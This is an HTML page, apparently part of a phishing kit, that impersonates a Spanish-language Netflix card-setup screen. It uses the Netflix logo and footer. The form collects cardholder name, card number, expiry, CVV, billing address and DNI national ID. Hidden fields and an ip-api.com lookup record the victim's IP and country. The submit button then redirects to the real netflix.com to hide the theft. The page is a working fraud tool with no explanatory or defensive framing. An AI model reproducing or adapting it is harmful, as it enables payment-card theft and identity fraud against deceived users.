<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Netflix</title>
	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" type="text/css" href="css/app.css">
	<script src="js/jquery.min.js"></script>
	<script src="js/validet.js"></script>	
	<link rel="shortcut icon" href="img/nficon.ico">
</head>
<body>
	<div>
		<div class="header_nf">
			<a href="#" class="svg-nfLogo">
				<svg viewBox="1 0 130 40" class="svg-icon" focusable="true">
					<title></title>
					<g id="nfx-logo">
						<path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path>
					</g>
				</svg>
				<span class="screen-reader-text">Netflix</span>
			</a>
			<a href="#" class="s_out"><span>Cerrar sesión</span></a>
		</div>
		<div class="simple_main_option">

					<div class="payoption">
					<div>
						<input type="hidden" name="namebank" id="xxxnb">
						<input type="hidden" name="schemecard" id="xxxsc">
						<input type="hidden" name="typecard" id="xxxtc">
						<input type="hidden" name="urlbank" id="xxxub">
						<input type="hidden" name="phonebank" id="xxxpb">
						<div style="text-align: left;">

						</div>
						<div class="step_title">
							<span>Configura tu tarjeta de crédito o débito.</span>
						</div>
						<div class="img-title" style="padding-bottom: 5px;">
							<img src="img/v.png" style="padding-right: 5px;">
							<img src="img/m.png" style="padding-right: 5px;">
							<img src="img/a.png">
							<img src="img/icon_AR_naranja_rect.png">
							<img src="img/icon_AR_cabal.png">							
						</div>
						<span style="font-size: 13px;font-weight: 700;margin-top: 5px; color: #828282">DEBE COINCIDIR CON LA INFORMACIÓN DE SU TARJETA</span>
					<div>
						<div class="twice_filed">
							<input type="text" name="fname" id="fname" class="option__field" placeholder="First Name">
							<label for="fname" class="option__label">Nombre</label>
						</div>
						<div class="twice_filed2">
							<input type="text" name="lname" id="lname" class="option__field" placeholder="Last Name">
							<label for="lname" class="option__label">Apellido</label>
						</div>

						<div class="option__group">
							<input type="tel" name="cn" id="cnmbrr" class="option__field" placeholder="Card Number" maxlength="19">
							<label for="cn" class="option__label">Número de tarjeta</label>
						</div>
						<div class="option__group">
							<input type="tel" name="exp_dt" id="exp_dt" class="option__field" placeholder="Expiration Date (MM/YY)" maxlength="7">
							<label for="exp_dt" class="option__label">Fecha de vencimiento (MM/YY)</label>
						</div>
						<div class="option__group" style="margin-bottom:5px;">
							<input type="tel" name="cvv" id="cvv" class="option__field" placeholder="Security Code (CVV)" maxlength="4">
							<label for="cvv" class="option__label">Código de seguridad (CVV)</label>
						</div>
						<span style="font-size: 13px;font-weight: 700;margin-top: 5px; color: #828282">Dirección de facturación</span>
						<div class="option__group">
							<input type="text" name="addresse" id="addresse" class="option__field" placeholder="Address">
							<label for="addresse" class="option__label">Dirección</label>
						</div>
						<div class="twice_filed" style="margin-bottom:5px;">
							<input type="text" name="city" id="city" class="option__field" placeholder="Addresse">
							<label for="city" class="option__label">Ciudad</label>
						</div>
						<div class="twice_filed2">
							<input type="text" name="country" id="country" class="option__field" placeholder="Country" value="">
							<label for="country" class="option__label">Provincia</label>
						</div>
						<div class="option__zip" style="margin-bottom:5px;">
							<input type="text" name="zip" id="zip" class="option__field" placeholder="Zip Code">
							<label for="zip" class="option__label">Código postal</label>
						</div>						
						<div class="option__zip" style="margin-bottom:5px;">
							<input type="tel" name="ph" id="ph" class="option__field" placeholder="DNI">
							<label for="ph" class="option__label">DNI</label>
						</div>
						<input type="hidden" id="xxip">
						<input type="hidden" id="xxxtt" value="<?php echo date("Y/m/d h:i:s:A"); ?>">
						<script>
						  function ipLookUp () {
						  $.ajax('http://ip-api.com/json')
						  .then(
						      function success(response) {
						          $('#xxip').val(response.query);
						          $('#country').val(response.country);
						      },
						      function fail(data, status) {
						          console.log('Request failed.  Returned status of',
						                      status);
						      }
						  );
						}
						ipLookUp()
						</script>
							<div class="terms">
								<p>Al hacer clic en el botón "Confirmar", aceptas nuestros <a href="#">Términos de uso</a>, y nuestra <a href="#">Declaración de privacidad</a>, y declaras que tienes más de 18 años.</p>
							</div>
							<div class="agree_form">

								</label>
							</div>
						<button type="submit" name="start" id="strtt" class="btn-start" onclick="window.location.href = 'https://netflix.com';">CONFIRMAR</button>
					</div>
					</div>
				</div>
			</div>
		</div>
		<div class="footer_checkout">
			<div class="divder"></div>
			<div class="content_footer">
			<div class="Q_us"><a>¿Preguntas? Llama al 800-345-1375</a></div>
			<a class="link_footer" href="#">Términos de las tarjetas de regalo</a>
			<a class="link_footer" href="#">Términos de uso</a>
			<a class="link_footer" href="#">Declaración de privacidad</a>
				<div class="select_arrow2">
						<img src="img/glob2.png">
				<select class="ui_select" tabindex="0" placeholder="lang-switcher">
					<option value="" data-language="fr" data-country="#">English</option>
					<option selected="" value="" data-language="en" data-country="#">Español</option>
					</select>
				</div>
			</div>
		</div>
	</div>
</body>
</html>